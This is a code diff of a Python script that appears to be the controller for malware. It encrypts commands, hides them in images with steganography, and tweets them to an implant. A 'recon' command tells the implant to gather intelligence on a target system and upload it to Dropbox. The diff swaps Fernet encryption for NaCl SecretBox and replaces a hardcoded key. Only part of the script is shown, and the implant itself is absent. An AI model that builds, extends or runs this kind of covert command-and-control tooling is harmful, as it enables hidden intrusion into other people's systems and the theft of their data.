@@ -1,4 +1,3 @@
-from cryptography.fernet import Fernet
 import stepic
 import tweepy
 from PIL import Image
@@ -6,6 +5,11 @@ from termcolor import colored
 import pyfiglet
 import sys
 import os
+from nacl.secret import SecretBox
+from nacl.utils import random as nacl_random
+# this is what pyca-cryptography uses for its .encode()/.decode() methods
+from base64 import urlsafe_b64encode as encode, urlsafe_b64decode as decode
+
 
 COMMANDS = {'help':['Shows this help'],
             'recon':['Recon module. Perform reconnaisance on the target system and upload Intel on Dropbox'],
@@ -14,21 +18,20 @@ COMMANDS = {'help':['Shows this help'],
            }
 
 # Twitter Dev Account API Keys
-CONSUMER_KEY = '' 
+CONSUMER_KEY = ''
 CONSUMER_SECRET = ''
 ACCESS_TOKEN = ''
 ACCESS_TOKEN_SECRET = ''
 
 # Encryption/Decryption Symmetric Key (Hardcoded) - PLEASE CHANGE IT!
-key = b'7H0RviHlSUDJ8ug1xf0lm5ZO_JZjWketfjcZ9gzaYZU='
+key = b'm_LAKLhu8ALI1-bufB1AfgR7kzxBrdHRaJ7KxvZm8dY='
+
 
 def encrypt(plaintext, key):
-    # Takes the plain text as string and key and encrypts and returns the encrypted text
     plaintext = plaintext.encode()
-    f = Fernet(key)
-    enctext = f.encrypt(plaintext)
-    enctext = enctext.decode()
-    return enctext
+    box = SecretBox(decode(key))
+    return str(encode(box.encrypt(plaintext, nacl_random(SecretBox.NONCE_SIZE))), 'utf-8')
+
 
 def main():
     global CONSUMER_KEY
@@ -74,7 +77,7 @@ def main():
             print("\n")
             api = input(colored("Enter the Dropbox API Key for Implant to upload the collected Intel: ", "blue"))
             message = command + " " + api
-            enctext =encrypt(message, key)
+            enctext = encrypt(message, key)
             embedInImage(enctext, imgpath)
             try:
                 postTweetPhoto()
@@ -122,6 +125,3 @@ def print_banner():
 
 if __name__ == "__main__":
     main()
-
-
-
